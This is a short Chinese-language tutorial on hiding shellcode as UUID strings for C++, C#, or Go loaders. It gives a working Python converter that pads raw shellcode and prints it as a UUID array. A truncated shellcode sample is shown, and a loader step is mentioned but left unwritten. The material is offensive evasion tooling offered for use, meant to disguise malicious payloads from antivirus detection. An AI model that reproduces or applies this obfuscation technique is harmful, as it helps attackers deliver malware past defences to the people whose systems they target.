通用唯一识别码（UUID），是用于计算机体系中以识别信息数目的一个128位标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID具有唯一性。演示加载语言：C++、C#、 Python2(3不行)、 Go。



## **shellcode转uuid字符串数组**
生成专门用于c#/c++/go语言的shellcode转uuid的python代码。
PS：64位shellcode就python.exe需要64位，go.exe也要64位的。

生成专门用于go语言的shellcode转uuid的python代码：
```
#coding=utf-8
import uuid

#Input your shellcode like:\xfc\x48\x83\xe4\xf0\xe8\xxx
buf = b"""\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\...\x86\xa0"""
import uuid

def convertToUUID(shellcode):
    # If shellcode is not in multiples of 16, then add some nullbytes at the end
    if len(shellcode) % 16 != 0:
        print("[-] Shellcode's length not multiplies of 16 bytes")
        print("[-] Adding nullbytes at the end of shellcode, this might break your shellcode.")
        print("\n[*] Modified shellcode length: ", len(shellcode) + (16 - (len(shellcode) % 16)))

        addNullbyte = b"\x00" * (16 - (len(shellcode) % 16))
        shellcode += addNullbyte

    uuids = []
    for i in range(0, len(shellcode), 16):
        uuidString = str(uuid.UUID(bytes_le=shellcode[i:i + 16]))
        uuids.append(uuidString.replace("'", "\""))
    return uuids

u = convertToUUID(buf)
print(str(u).replace("'", "\""))
```

^
## **加载器加载uuid**
go编译exe
为了更好，也可以使用分离。
